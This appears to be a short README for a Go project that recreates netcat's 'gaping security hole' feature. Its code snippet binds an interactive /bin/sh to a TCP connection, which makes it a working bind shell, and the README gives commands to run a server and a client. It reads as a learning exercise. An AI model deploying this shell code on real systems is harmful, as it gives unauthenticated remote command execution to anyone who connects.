# Netcat gaping security hole

Creating the Netcat gaping security hole in Golang.

## What was Netcat Gaping Security Hole?
Netcat is the TCP/IP swiss army knife, a more flexible, scriptable version of Telnet. It contains a feature
that allows stdin and stdout of any arbitary program to be redirected over TCP, enabling an attacker to run any shell
scripts. 

### Creating in Golang
With creating a Pipe, I allow stdin and stdout to redirected over TCP:
```go
// creating the shell
cmd := exec.Command("/bin/sh", "-i")
// creating our pipeline
rp, wp := io.Pipe()

// binding stdin and stdout to user connection and pipe output
cmd.Stdin = conn
cmd.Stdout = wp

// copy the input into pipeline
go io.Copy(conn, rp)
```

### How to run?
Server:
```go 
go run main.go
```

Client:
```go 
go run client/client.go
```
